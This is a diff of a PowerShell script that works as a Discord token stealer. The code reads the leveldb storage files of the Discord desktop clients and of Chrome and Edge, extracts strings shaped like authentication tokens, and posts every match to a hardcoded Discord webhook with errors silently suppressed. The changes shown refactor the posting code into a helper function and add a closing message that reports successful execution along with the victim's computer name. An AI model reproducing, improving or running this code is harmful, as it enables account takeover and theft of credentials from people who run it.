@@ -1,31 +1,37 @@
 $webhookUrl = "https://discord.com/api/webhooks/1490629749159104532/wFu6BV4lrg8HHuNzi10Ii4pMXYkJx0_xDuk5NnOgVDoPvJqwAoPsesebgGKOIm2WZ6Oc"
 
+function Send-Discord {
+    param($content)
+    $payload = @{ content = $content } | ConvertTo-Json
+    try {
+        Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json" -ErrorAction SilentlyContinue
+    } catch {}
+}
+
 # Discord app tokens
-$appPaths = @(
+$paths = @(
     "$env:LOCALAPPDATA\Discord\Local Storage\leveldb",
     "$env:LOCALAPPDATA\discordcanary\Local Storage\leveldb",
     "$env:LOCALAPPDATA\discordptb\Local Storage\leveldb"
 )
 
-foreach ($path in $appPaths) {
+foreach ($path in $paths) {
     if (Test-Path $path) {
         Get-ChildItem "$path\*.ldb" -ErrorAction SilentlyContinue | ForEach-Object {
             $content = Get-Content $_.FullName -Raw -ErrorAction SilentlyContinue
             $matches = [regex]::Matches($content, '[\w-]{24,}\.[\w-]{6,}\.[\w-]{27,}')
             foreach ($match in $matches) {
-                $payload = @{ content = "**[DISCORD APP TOKEN]**`n```$($match.Value)```" } | ConvertTo-Json
-                try { Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json" -ErrorAction SilentlyContinue } catch {}
-                Start-Sleep -Milliseconds 300
+                Send-Discord "**[DISCORD TOKEN]**`n```$($match.Value)```"
+                Start-Sleep -Milliseconds 200
             }
         }
     }
 }
 
-# Browser Discord tokens
+# Browser tokens
 $browserPaths = @(
     "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Local Storage\leveldb",
-    "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Local Storage\leveldb",
-    "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Local Storage\leveldb"
+    "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Local Storage\leveldb"
 )
 
 foreach ($path in $browserPaths) {
@@ -34,10 +40,11 @@ foreach ($path in $browserPaths) {
             $content = Get-Content $_.FullName -Raw -ErrorAction SilentlyContinue
             $matches = [regex]::Matches($content, '[\w-]{24,}\.[\w-]{6,}\.[\w-]{27,}')
             foreach ($match in $matches) {
-                $payload = @{ content = "**[DISCORD BROWSER TOKEN]**`n```$($match.Value)```" } | ConvertTo-Json
-                try { Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json" -ErrorAction SilentlyContinue } catch {}
-                Start-Sleep -Milliseconds 300
+                Send-Discord "**[BROWSER TOKEN]**`n```$($match.Value)```"
+                Start-Sleep -Milliseconds 200
             }
         }
     }
 }
+
+Send-Discord "**[INFO]** PowerShell payload executed successfully on $env:COMPUTERNAME"
